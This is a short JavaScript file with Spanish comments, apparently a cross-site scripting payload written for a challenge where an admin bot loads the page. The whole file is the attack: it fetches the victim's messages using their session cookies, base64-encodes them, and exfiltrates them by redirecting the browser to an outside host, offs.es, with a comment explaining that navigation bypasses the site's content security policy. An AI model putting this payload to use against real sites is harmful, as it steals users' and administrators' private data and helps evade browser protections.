// payload.js
(async function(){
  try {
    // pide los mensajes de la sesión actual (será la sesión admin cuando el bot cargue esto)
    const r = await fetch('/messages', { credentials: 'include' });
    const d = await r.json();

    // exfiltra navegando (no fetchear a dominio externo por CSP)
    const encoded = btoa(JSON.stringify(d));
    // reemplaza TU_IP:PUERTO por donde estás escuchando (ej. 192.168.0.12:1111 o localhost:1111)
    location.href = 'https://offs.es/?d=' + encodeURIComponent(encoded);
  } catch (e) {
    // navegación de fallback para depuración
    location.href = 'https://offs.es/?err=' + encodeURIComponent(String(e));
  }
})();

